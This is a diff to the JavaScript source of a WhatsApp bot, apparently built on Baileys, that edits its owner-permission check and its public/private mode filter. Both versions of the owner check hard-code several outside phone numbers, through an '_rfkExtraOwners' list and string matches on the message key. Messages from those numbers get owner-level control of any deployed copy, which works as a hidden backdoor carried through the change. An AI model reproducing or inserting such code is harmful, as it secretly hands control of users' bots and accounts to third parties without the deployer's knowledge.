@@ -382,13 +382,13 @@ const keyStr = JSON.stringify(msg.key || {});
         const _rfkExtraOwners = ["918086165391", "917907228818"];
         const isOwner = (() => {
       const _rfkAutoDeployerOwner = true;
-      if (m?.key?.fromMe) return true;
+      if (msg?.key?.fromMe) return true;
       const botBase = (sock?.user?.id || "").split(":")[0].split("@")[0];
       const botLid = (sock?.user?.lid || "").split(":")[0].split("@")[0];
       const sndBase = (typeof sender !== "undefined" ? sender : (m?.key?.participant || m?.key?.remoteJid || "")).split(":")[0].split("@")[0];
       if (botBase && sndBase === botBase) return true;
       if (botLid && sndBase === botLid) return true;
-      return Boolean((m?.key?.fromMe || ((m?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER)))))) /* _rfkUniversalFix */);
+      return Boolean((msg?.key?.fromMe || ((msg?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER)))))) /* _rfkUniversalFix */);
     })();
 
                 const m =
@@ -427,7 +427,7 @@ const cleanBody = hasPrefix ? trimmed.slice(PREFIX.length).trim() : trimmed;
                 if (!cmd) continue;
 
                 if (!hasPrefix && !isOwner) continue;
-if (MODE === "public" && !isOwner) continue;
+if (String(MODE).toLowerCase() === "private" && !isOwner) continue;
                 const text = args.join(" ");
 
                 try {
